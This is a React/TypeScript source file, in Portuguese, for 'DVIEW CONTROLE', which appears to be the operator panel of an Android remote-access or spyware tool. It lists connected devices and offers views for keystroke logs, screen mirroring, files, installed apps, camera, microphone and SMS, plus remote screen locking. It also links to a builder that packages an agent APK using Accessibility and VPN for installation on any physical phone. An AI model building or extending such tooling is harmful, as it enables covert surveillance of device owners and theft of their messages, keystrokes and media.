import { useEffect, useMemo, useState } from "react";
import {
  CircleDot,
  Download,
  MonitorSmartphone,
  Plus,
  Radio,
  SlidersHorizontal,
  Smartphone,
  Zap
} from "lucide-react";
import { useAppStore } from "../../store";
import { api } from "../../api";
import type { ControlDevice, ControlTool, InstalledAppItem } from "./types";
import { initialInstalledApps } from "./mockData";
import { DeviceSidebar } from "./DeviceSidebar";
import { DeviceToolMenu, getAppEmojiFallback } from "./DeviceToolMenu";
import { ScreenView } from "./views/ScreenView";
import { KeyboardLogView } from "./views/KeyboardLogView";
import { DeviceInfoView } from "./views/DeviceInfoView";
import { PermissionsView } from "./views/PermissionsView";
import { FilesView } from "./views/FilesView";
import { AppsListView } from "./views/AppsListView";
import { MediaView } from "./views/MediaView";

function formatLastSeen(iso?: string): string {
  if (!iso) return "agora";
  const diff = Date.now() - new Date(iso).getTime();
  if (isNaN(diff) || diff < 60000) return "agora";
  const mins = Math.floor(diff / 60000);
  if (mins < 60) return `${mins}m`;
  const hours = Math.floor(mins / 60);
  if (hours < 24) return `${hours}h`;
  return `${Math.floor(hours / 24)}d`;
}

function formatDateGroup(iso?: string): string {
  if (!iso) return "HOJE";
  const d = new Date(iso);
  if (isNaN(d.getTime())) return "HOJE";
  const now = new Date();
  if (
    d.getDate() === now.getDate() &&
    d.getMonth() === now.getMonth() &&
    d.getFullYear() === now.getFullYear()
  ) {
    return "HOJE";
  }
  const yest = new Date(now);
  yest.setDate(now.getDate() - 1);
  if (
    d.getDate() === yest.getDate() &&
    d.getMonth() === yest.getMonth() &&
    d.getFullYear() === yest.getFullYear()
  ) {
    return "ONTEM";
  }
  return d.toLocaleDateString("pt-BR", { day: "2-digit", month: "short", year: "numeric" }).toUpperCase();
}

function mapApiToControl(dev: any, existing?: ControlDevice): ControlDevice {
  const isOnline = (dev.status || "online") === "online";
  const netType = dev.networkType || existing?.networkType || (isOnline ? "wifi" : "offline");
  return {
    id: dev.id,
    name: dev.name,
    model: dev.model,
    ip: dev.ip || dev.ipAddress || (dev.id.startsWith("emu") ? "10.0.2.2" : "192.168.100.2"),
    battery: dev.battery ?? 100,
    status: dev.status || "online",
    lastSeen: formatLastSeen(dev.lastSeen),
    androidVersion: dev.androidVersion || "14.0",
    manufacturer: dev.model?.split(" ")[0] || "Android",
    wifiSignal: dev.signalStrength ?? existing?.wifiSignal ?? 90,
    networkType: netType,
    networkName: dev.networkName || existing?.networkName || (isOnline ? (netType === "wifi" ? "Wi-Fi 5GHz" : "4G LTE") : "Sem Conexão"),
    signalStrength: dev.signalStrength ?? existing?.signalStrength ?? (isOnline ? 95 : 0),
    networkSpeed: dev.networkSpeed || existing?.networkSpeed || (isOnline ? "86.4 Mbps" : "0 Mbps"),
    pingMs: dev.pingMs ?? existing?.pingMs ?? 14,
    screenLocked: existing?.screenLocked ?? false,
    dateGroup: formatDateGroup(dev.lastSeen || dev.enrolledAt),
    isFavorite: existing?.isFavorite ?? false
  };
}

export function ControlPanel() {
  const { devices: apiDevices, setView, upsertDevice, removeDevice, selectedDeviceId, setSelectedDeviceId } = useAppStore();
  const [controlDevices, setControlDevices] = useState<ControlDevice[]>(() =>
    (apiDevices || []).map((d) => mapApiToControl(d))
  );
  const [selectedId, setSelectedId] = useState<string>(() => selectedDeviceId || apiDevices[0]?.id || "");
  const [activeTool, setActiveTool] = useState<ControlTool>("tela");
  const [activeAppForScreen, setActiveAppForScreen] = useState<InstalledAppItem | null>(null);
  const [toastMsg, setToastMsg] = useState<string | null>(null);

  const showToast = (msg: string) => {
    setToastMsg(msg);
    setTimeout(() => setToastMsg(null), 3500);
  };

  // Auto-fetch real devices from backend on mount if not loaded
  useEffect(() => {
    if (!apiDevices || apiDevices.length === 0) {
      api.devices().then((devList) => {
        if (Array.isArray(devList) && devList.length > 0) {
          useAppStore.getState().setDevices(devList);
        }
      }).catch(() => {});
    }
  }, []);

  // Sync selectedDeviceId from store
  useEffect(() => {
    if (selectedDeviceId && selectedDeviceId !== selectedId) {
      setSelectedId(selectedDeviceId);
    }
  }, [selectedDeviceId]);

  // Sync real devices from useAppStore
  useEffect(() => {
    setControlDevices((curr) => {
      const existingMap = new Map(curr.map((d) => [d.id, d]));
      return (apiDevices || []).map((dev) => mapApiToControl(dev, existingMap.get(dev.id)));
    });

    if (apiDevices.length > 0 && (!selectedId || !apiDevices.some((d) => d.id === selectedId))) {
      const targetId = selectedDeviceId && apiDevices.some((d) => d.id === selectedDeviceId)
        ? selectedDeviceId
        : apiDevices[0].id;
      setSelectedId(targetId);
      setSelectedDeviceId(targetId);
    }
  }, [apiDevices]);

  const handleToggleFavorite = (deviceId: string) => {
    setControlDevices((curr) =>
      curr.map((d) => (d.id === deviceId ? { ...d, isFavorite: !d.isFavorite } : d))
    );
    const targetDev = controlDevices.find((d) => d.id === deviceId);
    if (targetDev) {
      showToast(
        `${targetDev.name} ${!targetDev.isFavorite ? "adicionado aos favoritos ★" : "removido dos favoritos"}.`
      );
    }
  };

  const handleAddEmulator = async () => {
    try {
      const emuList = controlDevices.filter((d) => d.id.startsWith("emu"));
      const count = emuList.length + 1;
      const emuPort = 5554 + (count - 1) * 2;
      const emuName = `Emulador Android #${count}`;
      const emuModel = `Pixel 7 (Port ${emuPort})`;

      let newId = `emu_${Date.now()}`;
      try {
        const res = await api.addEmulator({
          name: emuName,
          model: emuModel,
          port: emuPort
        });
        if (res?.device?.id) {
          newId = res.device.id;
        }
      } catch (err) {
        console.warn("Offline fallback for addEmulator:", err);
      }

      const newEmu: ControlDevice = {
        id: newId,
        name: emuName,
        model: emuModel,
        ip: `10.0.2.2:${emuPort}`,
        battery: 100,
        status: "online",
        lastSeen: "agora",
        androidVersion: "14.0",
        manufacturer: "Google AVD",
        wifiSignal: 100,
        screenLocked: false,
        dateGroup: "HOJE",
        isFavorite: false
      };

      upsertDevice({
        id: newId,
        name: emuName,
        model: emuModel,
        androidVersion: "14",
        status: "online",
        battery: 100,
        lastSeen: new Date().toISOString(),
        enrolledAt: new Date().toISOString(),
        consentRequired: false
      });

      setControlDevices((curr) => [newEmu, ...curr]);
      setSelectedId(newId);
      setActiveTool("tela");
      showToast(`Emulador ${emuName} conectado na porta ${emuPort} com sucesso.`);
    } catch {
      showToast("Erro ao conectar emulador.");
    }
  };

  const handleOpenAppControl = (app: InstalledAppItem) => {
    setActiveAppForScreen(app);
    setActiveTool("tela");
    showToast(`Iniciando transmissão de ${app.name} (${app.packageName}).`);
  };

  const selectedDevice = useMemo(() => {
    return controlDevices.find((d) => d.id === selectedId) || controlDevices[0];
  }, [controlDevices, selectedId]);

  const [syncedApps, setSyncedApps] = useState<InstalledAppItem[]>([]);

  useEffect(() => {
    if (!selectedDevice) return;
    api.getDeviceApps(selectedDevice.id)
      .then((realList) => {
        if (Array.isArray(realList) && realList.length > 0) {
          setSyncedApps(realList);
        }
      })
      .catch(() => {});
  }, [selectedDevice?.id]);

  const handleSelectTarget = (targetName: string) => {
    const list = syncedApps.length > 0 ? syncedApps : initialInstalledApps;
    const foundApp = list.find(
      (a) =>
        a.name.toLowerCase().includes(targetName.toLowerCase()) ||
        a.packageName.toLowerCase().includes(targetName.toLowerCase())
    );
    if (foundApp) {
      handleOpenAppControl(foundApp);
    } else {
      const meta = getAppEmojiFallback(targetName, "");
      const genericApp: InstalledAppItem = {
        id: `app_${targetName.toLowerCase().replace(/[^a-z0-9]/g, "_")}`,
        name: targetName,
        packageName: `com.android.${targetName.toLowerCase().replace(/[^a-z0-9]/g, "")}`,
        version: "v1.0",
        isSystem: false,
        status: "active",
        iconType: "tools",
        iconBg: meta.bg,
        iconColor: "#ffffff",
        iconLetter: targetName.charAt(0).toUpperCase(),
        emoji: meta.emoji,
        sizeMb: 14.2,
        installDate: "Hoje",
        permissions: []
      };
      handleOpenAppControl(genericApp);
    }
  };

  const onlineCount = controlDevices.filter((d) => d.status === "online").length;
  const offlineCount = controlDevices.filter((d) => d.status === "offline").length;

  const handleToggleLock = async () => {
    if (!selectedDevice) return;
    try {
      const res = await api.sendPower(selectedDevice.id);
      const nextLocked = res?.locked ?? !selectedDevice.screenLocked;
      setControlDevices((curr) =>
        curr.map((d) => (d.id === selectedDevice.id ? { ...d, screenLocked: nextLocked } : d))
      );
      showToast(
        `Comando executado: ${nextLocked ? "TELA BLOQUEADA" : "TELA DESBLOQUEADA"} em ${selectedDevice.name}.`
      );
    } catch {
      const nextLocked = !selectedDevice.screenLocked;
      setControlDevices((curr) =>
        curr.map((d) => (d.id === selectedDevice.id ? { ...d, screenLocked: nextLocked } : d))
      );
      showToast(
        `Comando enviado: ${nextLocked ? "TELA BLOQUEADA" : "TELA DESBLOQUEADA"} em ${selectedDevice.name}.`
      );
    }
  };

  const handleUninstall = async () => {
    if (!selectedDevice) return;
    if (confirm(`Deseja realmente solicitar a desinstalação do agente em ${selectedDevice.name}?`)) {
      try {
        await api.deleteDevice(selectedDevice.id);
      } catch (err) {
        console.warn("Backend offline or error deleting device:", err);
      }
      removeDevice(selectedDevice.id);
      const remaining = controlDevices.filter((d) => d.id !== selectedDevice.id);
      setControlDevices(remaining);
      if (selectedId === selectedDevice.id) {
        const nextId = remaining[0]?.id || "";
        setSelectedId(nextId);
        setSelectedDeviceId(nextId || null);
      }
      showToast(`Ordem de remoção transmitida e dispositivo ${selectedDevice.name} desvinculado.`);
    }
  };

  return (
    <div className="control-panel-master">
      {/* Toast Alert */}
      {toastMsg && (
        <div className="tactical-toast-badge toast-success">
          <span>{toastMsg}</span>
        </div>
      )}

      {/* Top Global Control Bar */}
      <div className="control-topbar">
        <div className="control-topbar-brand-block">
          <span className="control-brand-title">DVIEW CONTROLE</span>
          <div className="control-brand-status-row">
            <span className="brand-stat-item online">
              <span className="brand-stat-dot online" /> {onlineCount} online
            </span>
            <span className="brand-stat-item offline">
              <span className="brand-stat-dot offline" /> {offlineCount} offline
            </span>
            <span className="brand-stat-item" style={{ color: "#38bdf8" }}>
              <CircleDot size={11} style={{ marginRight: "4px" }} /> Telemetria em Tempo Real
            </span>
          </div>
        </div>
      </div>

      {/* Render 3-Columns or Empty State */}
      {controlDevices.length === 0 ? (
        <div className="control-empty-state-view">
          <div className="control-empty-state-card">
            <div className="control-empty-state-icon">
              <Smartphone size={38} style={{ color: "var(--crimson-neon, #ff1a2a)" }} />
            </div>
            <h2>Nenhum Dispositivo Conectado em Tempo Real</h2>
            <p className="control-empty-subtitle">
              O painel de controle está conectado à API e ao Socket.IO aguardando dispositivos reais ou instâncias de emuladores para iniciar o espelhamento e a supervisão remota.
            </p>

            <div className="control-empty-actions-grid">
              <div className="control-empty-action-card">
                <div className="action-card-header">
                  <MonitorSmartphone size={20} style={{ color: "#38bdf8" }} />
                  <strong>Conectar Emulador Android</strong>
                </div>
                <p>
                  Inicie instantaneamente uma instância simulada do Android (porta 5554+ / Loopback) pronta para receber comandos e projeção de tela.
                </p>
                <button
                  type="button"
                  className="primary compact-btn"
                  onClick={handleAddEmulator}
                  style={{ marginTop: "auto", display: "inline-flex", alignItems: "center", gap: "6px" }}
                >
                  <Plus size={14} /> Adicionar Emulador Agora
                </button>
              </div>

              <div className="control-empty-action-card">
                <div className="action-card-header">
                  <Download size={20} style={{ color: "#22c55e" }} />
                  <strong>Gerar APK com Túnel Seguro</strong>
                </div>
                <p>
                  Crie um instalador APK corporativo do Agente com ativação de VPN e Acessibilidade para instalar em qualquer aparelho físico.
                </p>
                <button
                  type="button"
                  className="secondary compact-btn"
                  onClick={() => setView("Gerador APK")}
                  style={{ marginTop: "auto", display: "inline-flex", alignItems: "center", gap: "6px" }}
                >
                  <SlidersHorizontal size={14} /> Abrir Construtor de APK
                </button>
              </div>

              <div className="control-empty-action-card">
                <div className="action-card-header">
                  <Radio size={20} style={{ color: "#facc15" }} />
                  <strong>Conectar Aparelho Físico</strong>
                </div>
                <p>
                  No dispositivo cliente, aponte a URL do servidor para o IP da sua máquina (ex: <code>http://192.168.100.2:3000</code>).
                  A conexão é automática via telemetria WebSocket.
                </p>
                <span className="badge online" style={{ marginTop: "auto", alignSelf: "flex-start", fontSize: "11px" }}>
                  <CircleDot size={10} /> Escutando na porta 3000
                </span>
              </div>
            </div>
          </div>
        </div>
      ) : (
        <div className="control-three-cols-wrapper">
          {/* Col 1: Devices list */}
          <DeviceSidebar
            devices={controlDevices}
            selectedId={selectedDevice?.id || ""}
            onSelect={(dev) => {
              setSelectedId(dev.id);
              setSelectedDeviceId(dev.id);
            }}
            onToggleFavorite={handleToggleFavorite}
            onAddEmulator={handleAddEmulator}
          />

          {/* Col 2: Selected device tools menu */}
          {selectedDevice && (
            <DeviceToolMenu
              device={selectedDevice}
              activeTool={activeTool}
              onSelectTool={setActiveTool}
              onToggleLock={handleToggleLock}
              onUninstall={handleUninstall}
              onSelectTarget={handleSelectTarget}
            />
          )}

          {/* Col 3: Active tool workspace */}
          <main className="control-col-workspace">
            {selectedDevice ? (
              <>
                {activeTool === "tela" && (
                  <ScreenView
                    device={selectedDevice}
                    activeApp={activeAppForScreen}
                    onCloseApp={() => setActiveAppForScreen(null)}
                    allDevices={controlDevices}
                    onSelectDevice={(dev) => setSelectedId(dev.id)}
                  />
                )}
                {activeTool === "teclado" && <KeyboardLogView device={selectedDevice} />}
                {activeTool === "dispositivo" && <DeviceInfoView device={selectedDevice} />}
                {activeTool === "permissoes" && <PermissionsView device={selectedDevice} />}
                {activeTool === "arquivos" && <FilesView device={selectedDevice} />}
                {activeTool === "apps" && (
                  <AppsListView
                    device={selectedDevice}
                    onOpenAppControl={handleOpenAppControl}
                  />
                )}
                {(activeTool === "camera" || activeTool === "mic" || activeTool === "sms") && (
                  <MediaView device={selectedDevice} subType={activeTool} />
                )}
              </>
            ) : (
              <div className="control-empty-hint" style={{ margin: "auto" }}>
                Selecione um dispositivo na lista à esquerda para carregar as ferramentas de controle.
              </div>
            )}
          </main>
        </div>
      )}
    </div>
  );
}
